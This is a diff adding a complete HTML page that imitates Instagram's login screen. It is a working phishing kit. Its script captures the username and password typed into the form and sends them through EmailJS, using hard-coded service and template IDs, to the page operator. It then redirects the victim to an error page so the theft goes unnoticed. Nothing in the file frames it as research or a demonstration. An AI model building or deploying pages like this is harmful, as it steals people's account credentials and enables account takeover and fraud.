@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background-color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #121212;
+      border: 1px solid #333;
+      width: 350px;
+      padding: 40px 40px 20px;
+      text-align: center;
+      color: #fff;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 175px;
+      filter: invert(1);
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 6px;
+      border: 1px solid #333;
+      background-color: #262626;
+      color: #fff;
+      font-size: 12px;
+      outline: none;
+    }
+
+    .login-btn {
+      background-color: #3897f0;
+      color: white;
+      padding: 8px;
+      width: 100%;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+    }
+
+    .divider div {
+      flex: 1;
+      height: 1px;
+      background-color: #333;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .fb-login {
+      color: #3897f0;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .forgot-pass {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #b3b3b3;
+      cursor: pointer;
+    }
+
+    .signup {
+      background-color: #121212;
+      border: 1px solid #333;
+      text-align: center;
+      margin-top: 10px;
+      padding: 20px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    .signup a {
+      color: #3897f0;
+      font-weight: bold;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div>
+    <div class="container">
+      <div class="logo">
+        <img src="Instagram_logo.svg" alt="Instagram" />
+      </div>
+      <form id="loginForm">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required />
+        <div style="position: relative;">
+          <input type="password" name="password" id="password" placeholder="Password" required onclick="login()"/>
+          <span id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #ffffff; font-size: 12px; cursor: pointer;">Show</span>
+        </div>
+        <button type="submit" class="login-btn" onclick="login()">Log In</button>
+      </form>
+      <div class="divider">
+        <div></div>
+        <span>OR</span>
+        <div></div>
+      </div>
+      <div class="fb-login">Log in with Facebook</div>
+      <div class="forgot-pass">Forgot password?</div>
+    </div>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <script>
+    // Init with your public key
+    emailjs.init("jzCWlE542gGmvo9Ib");
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_iox3f3l", "template_7slc8o6", this)
+        .then(function () {
+          window.location.href = "error.html";
+        }, function (error) {
+          alert("Something went wrong!");
+          console.log("FAILED...", error);
+        });
+    });
+
+
+
+  const passwordInput = document.getElementById("password");
+  const togglePassword = document.getElementById("togglePassword");
+
+  togglePassword.addEventListener("click", () => {
+    const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+    passwordInput.setAttribute("type", type);
+    togglePassword.textContent = type === "password" ? "Show" : "Hide";
+  });
+  </script>
+</body>
+
+</html>
